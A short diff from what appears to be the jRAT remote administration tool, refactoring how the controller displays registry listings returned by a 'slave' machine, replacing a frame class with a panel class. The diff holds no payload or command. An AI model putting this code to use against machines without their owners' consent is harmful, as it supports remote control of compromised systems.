@@ -1,14 +1,10 @@
 package jrat.module.registry;
 
-import com.redpois0n.pathtree.FolderTreeNode;
-import com.redpois0n.pathtree.PathTreeNode;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.AbstractIncomingPacket;
-import jrat.module.registry.ui.FrameRemoteRegistry;
+import jrat.module.registry.ui.PanelRegistry;
 
 import java.io.DataInputStream;
-import javax.swing.ImageIcon;
-import javax.swing.tree.TreePath;
 
 public class PacketResult extends AbstractIncomingPacket {
 
@@ -16,7 +12,7 @@ public class PacketResult extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		String path = slave.readLine();
 
-		FrameRemoteRegistry frame = (FrameRemoteRegistry) slave.getFrame(FrameRemoteRegistry.class);
+		PanelRegistry frame = (PanelRegistry) slave.getPanel(PanelRegistry.class);
 
 		while (dis.readBoolean()) {
 			String line = slave.readLine();
